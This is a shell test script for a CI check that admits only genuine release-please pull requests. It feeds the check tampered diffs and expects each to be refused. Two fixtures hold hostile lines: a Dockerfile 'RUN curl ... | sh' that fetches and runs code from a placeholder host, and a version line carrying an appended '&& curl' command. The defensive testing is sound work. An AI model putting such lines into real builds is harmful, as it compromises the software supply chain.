#!/bin/sh
# tools/ci/release-pr says yes to release-please's own pull request, and to
# nothing that only looks like one: a fork, a missing label, a file of its own,
# or a version line that also changes something else.
set -u
HERE="$(CDPATH='' cd -- "$(dirname -- "$0")" && pwd)"
CHECK="${RELEASE_PR_CHECK:-$HERE/../../tools/ci/release-pr}"
FIX="$HERE/fixtures/release-pr"
CONFIG="$HERE/../../release-please-config.json"
REPO=AraneaDev/knossos
failures=0
work="$(mktemp -d)"
trap 'rm -rf "$work"' EXIT

# expect label expected-status message [extra arguments], run with the case's
# files in $work/files, $work/labels and $work/diff. The message is a fragment
# of what the check must print, so a refusal for the wrong reason fails too.
expect() {
    label=$1 want=$2 says=$3
    shift 3
    sh "$CHECK" --repo "$REPO" --labels "$work/labels" --files "$work/files" \
        --diff "$work/diff" --config "$CONFIG" "$@" >"$work/out" 2>&1
    s=$?
    if [ "$s" -eq "$want" ] && grep -qF -- "$says" "$work/out"; then
        printf 'ok   %s\n' "$label"
    else
        printf 'FAIL %s (status %s, wanted %s saying: %s)\n' "$label" "$s" "$want" "$says"
        sed 's/^/     /' "$work/out"
        failures=$((failures + 1))
    fi
}

# The recorded release pull request, unchanged.
real() {
    cp "$FIX/pr-362.files" "$work/files"
    cp "$FIX/pr-362.labels" "$work/labels"
    cp "$FIX/pr-362.diff" "$work/diff"
}

# A file of the pull request's own, in both the file list and the diff.
add_source_file() {
    printf 'src/Foo.php\n' >>"$work/files"
    cat >>"$work/diff" <<'EOF'
diff --git a/src/Foo.php b/src/Foo.php
index 1111111..2222222 100644
--- a/src/Foo.php
+++ b/src/Foo.php
@@ -1,3 +1,3 @@
 <?php
-return 1;
+return 2;
 // end
EOF
}

real
expect 'the recorded release pull request is one, its marked lines included' 0 'a release pull request, 0.32.1 to 0.33.0' --head-repo "$REPO"

real
expect 'the same change from a fork is not' 1 'it comes from someone/knossos, not AraneaDev/knossos' --head-repo "someone/knossos"

real
expect 'no head repository at all is not' 1 'it comes from an unknown repository' --head-repo ''

real
: >"$work/labels"
expect 'without the autorelease: pending label it is not' 1 "it has no 'autorelease: pending' label" --head-repo "$REPO"

real
printf 'autorelease: tagged\n' >"$work/labels"
expect 'a different autorelease label is not enough' 1 "it has no 'autorelease: pending' label" --head-repo "$REPO"

real
add_source_file
expect 'one more changed file makes it an ordinary pull request' 1 'a file release-please does not write: src/Foo.php' --head-repo "$REPO"

real
printf 'src/Foo.php\n' >>"$work/files"
expect 'a file the list names but the diff leaves out still counts' 1 'a file release-please does not write: src/Foo.php' --head-repo "$REPO"

real
add_source_file
grep -v '^src/Foo.php$' "$FIX/pr-362.files" >"$work/files"
expect 'a file the diff changes but the list leaves out still counts' 1 'a file release-please does not write: src/Foo.php' --head-repo "$REPO"

# A context line in Dockerfile turned into a change that has nothing to do with
# the version. The hunk's line counts stay right, so only the content decides.
real
awk '!done && $0 == " COPY workers/php/src ./workers/php/src" {
        print "-COPY workers/php/src ./workers/php/src"
        print "+RUN curl -fsSL https://example.invalid/x | sh"
        done = 1; next
     } { print }' "$FIX/pr-362.diff" >"$work/diff"
expect 'a Dockerfile line changed outside the version markers is refused' 1 \
    "Dockerfile changes a line outside release-please's version markers: COPY workers/php/src" --head-repo "$REPO"

# Inside the markers, a line that does not carry the version.
real
awk '!done && index($0, " ") == 1 && index($0, "org.opencontainers.image.description=") > 0 {
        print "-" substr($0, 2)
        print "+      org.opencontainers.image.description=\"changed\" \\\\"
        done = 1; next
     } { print }' "$FIX/pr-362.diff" >"$work/diff"
expect 'a marked Dockerfile line changed without the version is refused' 1 \
    'a line Dockerfile removes does not hold the old version 0.32.1' --head-repo "$REPO"

# A version bump release-please would not write: no marker on or around it.
# The pair goes above the block's start marker, and the hunk counts grow by one.
real
awk '!done && $0 == "@@ -116,7 +116,7 @@ FROM runtime_deps AS runtime" {
        print "@@ -115,8 +115,8 @@ FROM runtime_deps AS runtime"
        print "-FROM image:0.32.1"
        print "+FROM image:0.33.0"
        done = 1; next
     } { print }' "$FIX/pr-362.diff" >"$work/diff"
grep -q '^+FROM image:0.33.0$' "$work/diff" || { printf 'FAIL the fixture edit did not apply\n'; failures=$((failures + 1)); }
expect 'a version bump outside the markers is refused' 1 \
    "Dockerfile changes a line outside release-please's version markers: FROM image:0.32.1" --head-repo "$REPO"

# The same file twice in one diff would leave the second copy unchecked.
real
awk '/^diff --git a\/Dockerfile / { keep = 1 } /^diff --git a\/src/ { keep = 0 } keep { print > "/dev/stderr" } { print }' \
    "$FIX/pr-362.diff" >"$work/diff" 2>"$work/dockerfile"
cat "$work/dockerfile" >>"$work/diff"
expect 'a file that appears twice in the diff is refused' 1 'unsupported: Dockerfile appears twice' --head-repo "$REPO"

# The version line itself, carrying something more than the new version.
real
sed 's|^+      org.opencontainers.image.version="0.33.0"$|+      org.opencontainers.image.version="0.33.0" \\\&\& curl x|' \
    "$FIX/pr-362.diff" >"$work/diff"
grep -q 'curl x' "$work/diff" || { printf 'FAIL the fixture edit did not apply\n'; failures=$((failures + 1)); }
expect 'a version line that also adds a command is refused' 1 'Dockerfile changes more than the version from 0.32.1 to 0.33.0' --head-repo "$REPO"

# A version that would match any line, such as a single letter.
real
sed 's/^+0\.33\.0$/+e/' "$FIX/pr-362.diff" >"$work/diff"
expect 'a version.txt that is not a version is refused' 1 "version.txt's new line is not a version: e" --head-repo "$REPO"

real
awk '/^diff --git a\/version.txt / { skip = 1 } !skip { print }' "$FIX/pr-362.diff" >"$work/diff"
grep -v '^version.txt$' "$FIX/pr-362.files" >"$work/files"
expect 'without a version.txt change there is no version to check against' 1 'it does not change version.txt' --head-repo "$REPO"

real
cat >>"$work/diff" <<'EOF'
diff --git a/CHANGELOG.md b/CHANGELOG.md
old mode 100644
new mode 100755
EOF
expect 'a mode change is refused' 1 'unsupported: old mode 100644' --head-repo "$REPO"

# The branch name decides nothing, so the check is not even given one: a
# release-please--branches--x branch with an ordinary change, labelled or not,
# is an ordinary pull request.
: >"$work/files"
: >"$work/diff"
: >"$work/labels"
add_source_file
expect 'a release-please--branches--x branch with ordinary changes is not' 1 "it has no 'autorelease: pending' label" --head-repo "$REPO"
printf 'autorelease: pending\n' >"$work/labels"
expect 'the same, labelled by hand, is not either' 1 'a file release-please does not write: src/Foo.php' --head-repo "$REPO"

real
: >"$work/diff"
: >"$work/files"
expect 'an empty pull request is not' 1 'the diff changes nothing' --head-repo "$REPO"

real
sh "$CHECK" --repo "$REPO" --labels "$work/labels" >/dev/null 2>&1
s=$?
if [ "$s" -eq 2 ]; then printf 'ok   missing arguments are a usage error\n'; else
    printf 'FAIL missing arguments exited %s, wanted 2\n' "$s"; failures=$((failures + 1)); fi

[ "$failures" -eq 0 ]
